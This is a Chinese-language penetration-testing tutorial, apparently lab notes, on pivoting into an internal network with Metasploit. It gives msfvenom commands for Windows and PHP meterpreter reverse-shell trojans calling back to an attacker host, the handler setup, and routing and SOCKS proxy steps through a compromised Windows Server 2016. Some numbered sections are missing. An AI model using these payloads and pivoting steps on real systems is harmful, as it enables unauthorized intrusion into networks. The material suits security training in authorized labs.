# ==内网代理==

### 内网渗透-内网代理

首先创建好木马并且上传至目标服务器

kali 上执行

```shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=6666 prependmigrateprocess=explorer.exe prependmigrate=true -f exe > /opt/shell.exe

#然后开启msfconsole
┌──(root㉿kali)-[/opt]
└─# msfconsole

msf6 exploit(multi/handler) > set lhost 192.168.1.102
lhost => 192.168.1.102
msf6 exploit(multi/handler) > set lport 6666
lport => 6666
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > run
```

将生成的 shell.exe 上传到 win server 2016 并且运行 shell.exe 然后 kali 中进入 meterpreter 提示符

#### 二、PHP木马+HTTP代理

其实除了使用Socks5的代理协议外，我们也经常会看到使用HTTP协议来作为代理服务器，其实在MSF中也可以利用HTTP协议来配置代理服务器。

以PHP举例，假设跳板机Windows2016上存在一台Web服务器，并且运行PHP脚本，此时，也可以通过植入PHP的Payload的方式来连接到Meterpreter，并设置内网路由和代理。

##### 1、在MSF中生成PHP木马

```shell
┌──(root?kali)-[/home/kali]
└─# msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.1.102 lport=4444 -f raw > /opt/shell.php
```

##### 4、在MSF中利用木马完成内网代理

（1）手工添加路由：

> 在这里我需要提醒一下，之前进行内网扫描做了端口转发并配了路由。配路由的目的是在进行扫描时，使得流量出去了还可以回来，这样才能实现有去有回。
>
> 而且，只有路由没有端口转发也无法实现内网的访问
>
> 有端口转发没有路由攻击机只能访问被做了端口转发的内网主机，比如这里的win server2016

> 而在这里需要添加路由的目的是，做了代理，攻击机借助 win server 2016 作为 代理服务器从而实现访问内网，但是如果没有路由，只有代理，流量能出去，但是回不来，所以也就无法访问，即使用了代理也还是需要路由的

#### 四、为MSF设置全局代理：

MSF进入跳板机后，可以通过 auxiliary/server/socks_proxy 模块配置代理供外部其他应用程序使用，但是也有一些情况是，先有了外部的代理，MSF才能进行连接，此时就需要为MSF配置全局代理，让MSF的流量可以通过其他代码进行处理。那么在MSF中使用以下命令配置后，MSF就可以通过别的代理进行访问了

```
setg proxies socks5:127.0.0.1:1080
也可以使用getg获取参数值
getg proxies
```
